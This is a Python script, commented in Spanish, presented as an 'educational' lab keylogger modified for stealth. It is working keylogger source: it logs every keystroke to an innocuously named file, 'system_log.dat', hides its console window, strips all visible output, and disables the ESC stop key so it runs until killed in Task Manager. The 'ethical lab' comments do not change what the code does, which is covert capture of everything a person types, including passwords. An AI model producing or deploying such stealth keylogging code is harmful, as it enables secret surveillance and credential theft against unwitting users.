"""
Keylogger Educativo - Modo Sigiloso (VERSIÓN DE LABORATORIO)
ADVERTENCIA: Este script modificado NO tiene ventana visible.
Para cerrarlo: ABRE EL ADMINISTRADOR DE TAREAS -> pythonw.exe -> FINALIZAR TAREA
"""

# ============================================================
# CAMBIO 1: Importar librerías necesarias para el sigilo
# ============================================================
import os
import sys
import datetime
import ctypes
from pynput import keyboard

# ============================================================
# CAMBIO 2: Ocultar la consola si se ejecuta como .pyw
# ============================================================
# En Windows, si el proceso padre es pythonw.exe, ocultamos la ventana
if sys.platform == "win32" and "pythonw" in sys.executable.lower():
    # Obtener el handle de la consola y ocultarla
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd != 0:
        ctypes.windll.user32.ShowWindow(whnd, 0)  # 0 = SW_HIDE
        ctypes.windll.kernel32.CloseHandle(whnd)

# ============================================================
# CAMBIO 3: No imprimir NADA por pantalla (borramos los print)
# ============================================================
# En la versión original había prints de advertencia.
# Los eliminamos TODOS para que no se vea nada.
# Solo queda un log en archivo.

class SilentKeyLogger:
    def __init__(self):
        self.log_file = "system_log.dat"  # <-- CAMBIO: Nombre menos obvio que .txt
        self.running = True
        self._write_header()
        
    def _write_header(self):
        """Escribe el encabezado en el archivo de log"""
        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(f"\n=== SESSION: {datetime.datetime.now()} ===\n")
        except:
            pass  # Silencio absoluto si falla
        
    def on_press(self, key):
        """Callback cuando se presiona una tecla"""
        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(f"{key.char}")
        except AttributeError:
            with open(self.log_file, "a", encoding="utf-8") as f:
                teclas_especiales = {
                    keyboard.Key.space: " ",
                    keyboard.Key.enter: "[ENTER]\n",
                    keyboard.Key.tab: "[TAB]",
                    keyboard.Key.backspace: "[BKSP]",
                    keyboard.Key.esc: "[ESC]",
                    keyboard.Key.shift: "",
                    keyboard.Key.ctrl_l: "",
                    keyboard.Key.alt_l: "",
                }
                # No escribimos SHIFT/CTRL/ALT para reducir ruido
                if key not in [keyboard.Key.shift, keyboard.Key.ctrl_l, 
                              keyboard.Key.ctrl_r, keyboard.Key.alt_l, keyboard.Key.alt_r]:
                    f.write(f"{teclas_especiales.get(key, f'[{key}]')}")
        
    def on_release(self, key):
        """
        CAMBIO 4: La tecla ESC YA NO DETIENE EL PROGRAMA
        Para detenerlo en el laboratorio, usa el Administrador de Tareas
        """
        # ============================================================
        # ESTA ES LA PARTE CLAVE QUE ELIMINAMOS POR SEGURIDAD ÉTICA
        # if key == keyboard.Key.esc:
        #     return False  
        # ============================================================
        
        # En su lugar, ponemos una "kill switch" de laboratorio:
        # Solo se detiene si escribes una combinación secreta.
        # NO LA PONGO FUNCIONAL PARA MANTENERLO ÉTICO.
        # (Dejamos el return True para que nunca se detenga solo)
        return True
        
    def start(self):
        """Inicia el listener en modo oculto"""
        with keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release) as listener:
            listener.join()

# ============================================================
# CAMBIO 5: Ejecución directa sin preguntar nada
# ============================================================
if __name__ == "__main__":
    # Eliminamos TODA interacción con el usuario (inputs, prints)
    # Simplemente arranca.
    logger = SilentKeyLogger()
    logger.start()